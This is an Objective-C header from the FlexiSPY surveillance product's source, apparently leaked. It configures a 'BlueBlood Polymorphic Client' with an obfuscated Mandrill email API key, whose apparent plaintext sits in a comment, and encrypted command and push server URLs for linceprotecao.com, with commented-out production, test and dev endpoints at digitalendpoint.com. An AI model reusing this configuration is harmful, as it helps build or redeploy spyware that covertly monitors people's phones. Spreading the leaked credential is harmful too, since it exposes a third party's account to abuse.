////
//  Product.h
//  FlexiSPY
//
//  Created by Makara Khloth on 6/8/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//
#if TARGET_OS_IPHONE
    #import <UIKit/UIKit.h>
#endif

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> [ Email Provider Mandrill ] <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// DYChWrD-hNV5K2QxqqU3DA
unsigned char kMandrillKey[] = {0x64,0x52,0x97,0x30,0x3e,0x5e,0x41,0x10,0xd7,0x9d,0xb4,0xce,0x1f,0xee,0x6d,0x50,0x22,0x10,0xfe,0x5,0x3d,0x5d,0x25,0x57,0xc3,0xed,0xc4,0x78,0x39,0xb5,0x53,0x99};

//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> [ Port Number ]  <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

unsigned int kPushServerPort = 443;

//====================================================================================================================
//==============[Linceceprotecao]
/*
 Product Id			: ​2207
 Protocol Language	: 1
 Protocol Version	: 11
 Product Version	: x.x.x
 Product Name		: BlueBlood
 Product Description: BlueBlood Polymorphic Client
 Language			: English
 Hash Tail			: UNxS3LEICEUZ06P8n7PZEVUHJjSVuI4E
*/

//=====>>>[ProductInfoCipher]
unsigned char kProductInfoCipher[] = {0xd0,0x50,0x1b,0xe2,0xc3,0x66,0xc6,0xe2,0x35,0x6d,0xe8,0x28,0x6d,0x5,0x28,0x8,0xc9,0xc7,0x5f,0xb1,0xc,0xaf,0xce,0xed,0xf6,0xf8,0xbe,0x32,0x43,0x25,0xa3,0x2c,0xff,0x75,0xb0,0x78,0xfe,0x3d,0x46,0x8d,0x9a,0x36,0xea,0x86,0x9d,0x3a,0xb1,0xb5,0x8f,0x2d,0xd9,0x9a,0x5f,0x2f,0xde,0x9f,0xbb,0x1e,0x87,0x6d,0x3b,0x5c,0x29,0x7a,0x7f,0x8b,0x57,0xd6,0xb9,0xd5,0xaa,0xf9,0x3f,0x8b,0x5e,0xf1,0x30,0x4f,0x4,0xb1,0x2a,0x2f,0x93,0x9e,0xe6,0x68,0xbb,0x9e,0xc,0x3c,0x3a,0x83,0x78,0xe3,0xf3,0x62,0xb8,0xc0,0x48,0x99,0x50,0x51,0x94,0x12,0xe6,0x39,0xa4,0x4f,0x77,0x95,0xe8,0x8e,0x9e,0xf1,0x5a,0xe3,0xff,0x87,0x85,0xda,0x9a,0xef,0x58,0x18,0xe2,0xac,0xb8,0x9c};

// [PUSH-Production] push.linceprotecao.com
unsigned char kPushServerUrl[] = {0xb6,0xe2,0x6b,0xeb,0xe2,0x9c,0x1e,0xe0,0xbd,0x67,0x92,0x38,0xdb,0x6f,0x44,0x76,0x70,0x14,0xb,0x3a,0x84,0x2f,0xb,0x41,0x49,0xf3,0x15,0x19,0xfb,0xcc,0x60,0x36};

// [SERVER_URL-Production] http://csclient.linceprotecao.com
unsigned char kServerUrl[] = {0xe8,0x76,0x56,0x72,0x41,0x4a,0xd,0x91,0xa,0x4c,0x2a,0x78,0xca,0xad,0x9c,0x37,0x6e,0xfb,0x1b,0x46,0x8d,0xd9,0x15,0x78,0x34,0x67,0x5,0x15,0xfa,0xbe,0xfb,0x6b,0xa1,0xd9,0x5f,0x29,0xab,0x4c,0x23,0x51,0x1f,0xc3,0x95,0x47,0xf6,0xf5,0x4d,0xdd};

//====================================================================================================================
//==============[KnowIT]
/*
 Product Id			: ​2007
 Protocol Language	: 1
 Protocol Version	: 11
 Product Version	: x.x.x
 Product Name		: BlueBlood
 Product Description: BlueBlood Polymorphic Client
 Language			: English
 Hash Tail			: UNxS3LEICEUZ06P8n7PZEVUHJjSVuI4E
*/

//=====>>>[ProductInfoCipher]

//unsigned char kProductInfoCipher[] = {0x16,0xf1,0x76,0x21,0x95,0x88,0x79,0x4,0x58,0xf8,0xcf,0xba,0xb5,0x74,0x8b,0x58,0x3b,0x65,0x2c,0xa7,0x54,0x8f,0x7e,0xc1,0x35,0xb,0x42,0x55,0x5b,0xd9,0x99,0x5f,0xec,0xda,0x4f,0xb2,0x78,0x75,0xb1,0x7b,0x30,0xda,0x39,0xec,0x6c,0xa9,0xbd,0x66,0xa4,0x87,0xe7,0xca,0x89,0x26,0xdc,0x18,0x8a,0x18,0xbc,0xd3,0xb0,0x37,0x29,0x45,0xd,0xe3,0x7a,0x11,0xfb,0x99,0x9d,0x56,0x95,0x9e,0x6d,0x73,0xfd,0x6b,0xf,0x90,0x22,0xf,0xc9,0x52,0xb,0x12,0xa4,0x7,0x56,0xfe,0x12,0xb1,0xfd,0x10,0x38,0xe7,0xe2,0xa1,0xe2,0x3d,0xab,0xeb,0xec,0x17,0xfc,0x7,0xa,0xa1,0x54,0x21,0x80,0xd0,0x92,0x95,0x7d,0x77,0x70,0xa4,0x90,0x4f,0x9,0x3a,0x14,0x30,0x8c,0x4f,0xb2,0x1};

//====================================================================================================================
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> [Production Push server KnowIT & Server url ]  <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// [PUSH-Production] push.digitalendpoint.com
//unsigned char kPushServerUrl[] = {0x45,0x23,0x36,0x33,0xe5,0xed,0x3,0x93,0x1d,0x1,0x3a,0xc3,0x31,0xab,0x38,0x8e,0x56,0xba,0x39,0xa6,0x56,0x8f,0xb4,0xbd,0xd5,0x62,0x4b,0xe9,0x57,0xd3,0x38,0xd9};

// [SERVER_URL-Production]  http://csclient.digitalendpoint.com
//unsigned char kServerUrl[] = {0xed,0x3b,0x6,0x66,0x32,0x8,0x77,0xcf,0x6f,0xe6,0xaa,0xc8,0xf2,0x97,0x27,0x6f,0xc3,0xd5,0x36,0x42,0x63,0xf5,0x84,0x2a,0x7a,0xff,0x79,0x7e,0x78,0x57,0x0,0x54,0x72,0xf,0x64,0x6b,0xeb,0x2a,0xf3,0xef,0x37,0xac,0x71,0x16,0xe6,0x49,0x2,0xe2};

//====================================================================================================================
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> [TEST Push server PUSH & Server url (Test & Dev)]  <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<

// [PUSH-( Test & Dev )] test-push.digitalendpoint.com
//unsigned char kPushServerUrl[] = {0xcc,0x14,0x25,0xd6,0xd9,0xa,0x21,0x92,0x67,0x69,0x92,0x3f,0x12,0x96,0x41,0x46,0x12,0xba,0x87,0x46,0xe7,0x1f,0x8b,0xc9,0x5f,0x5c,0x6c,0x68,0x1,0x7b,0xab,0x36,0x97,0x2,0x1c,0xc0,0xce,0x95,0xa1,0x0,0x31,0x3c,0x5b,0xa,0x1c,0x17,0xde,0x84};

// [SERVER_URL-Test] http://test-csclient.digitalendpoint.com
//unsigned char kServerUrl[] = {0x99,0x14,0x81,0xfd,0x9,0xf1,0xc0,0x8c,0xd,0x4c,0x7f,0x58,0x96,0xe9,0xea,0xd7,0xce,0x6,0xa0,0xb4,0xf8,0xd6,0xef,0x15,0xe9,0x20,0x8d,0x35,0xf7,0x39,0x78,0xbe,0x87,0x4e,0xc2,0xb2,0x2d,0xe3,0x32,0xaa,0xc3,0xda,0xe1,0x4,0xa5,0x95,0x5e,0x64};

// [SERVER_URL-Dev] http://dev-csclient.digitalendpoint.com
//unsigned char kServerUrl[] = {0x9c,0x4d,0x32,0x8,0x37,0xc1,0x23,0xa8,0x5,0x92,0x2c,0xdc,0x33,0x2,0xf6,0x6e,0x86,0x96,0x9d,0x42,0x1f,0x14,0xb8,0x3d,0x40,0x44,0x6,0xf3,0x29,0xfd,0x3d,0xb6,0x6d,0x91,0xc1,0x2e,0x77,0xd0,0x55,0x0,0x3c,0xc6,0x7a,0xb7,0x9a,0x58,0xaa,0x1a};


